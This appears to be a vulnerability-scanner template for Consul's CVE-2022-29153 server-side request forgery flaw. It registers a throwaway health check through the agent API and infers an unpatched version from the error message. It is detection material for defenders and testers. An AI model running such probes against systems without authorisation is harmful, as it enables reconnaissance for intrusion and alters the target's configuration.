name: poc-yaml-hashi-corpconsul-enterprise-cve-2022-29153-ssrf
manual: true
transport: http
set:
    rStrId: randomLowercase(8)
    rStrName: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: PUT
            path: /v1/agent/check/register
            headers:
                Content-Type: application/json
            body: |-
                {
                    "id": "{{randstr}}",
                    "name": "{{randstr}}",
                    "method": "GET",
                    "http": "/dev/null",
                    "interval": "10s",
                    "timeout": "1s",
                    "disable_redirects": true
                }
            follow_redirects: false
        expression: response.status == 400 && response.body_string.contains("unknown field \"disable_redirects\"")
expression: r0()
detail:
    author: xiaohe
    links:
        - https://discuss.hashicorp.com/t/hcsec-2022-10-consul-s-http-health-check-may-allow-server-side-request-forgery/38393
        - https://github.com/hashicorp/consul/pull/12685
        - https://nvd.nist.gov/vuln/detail/CVE-2022-29153
    vulnerability:
        level: high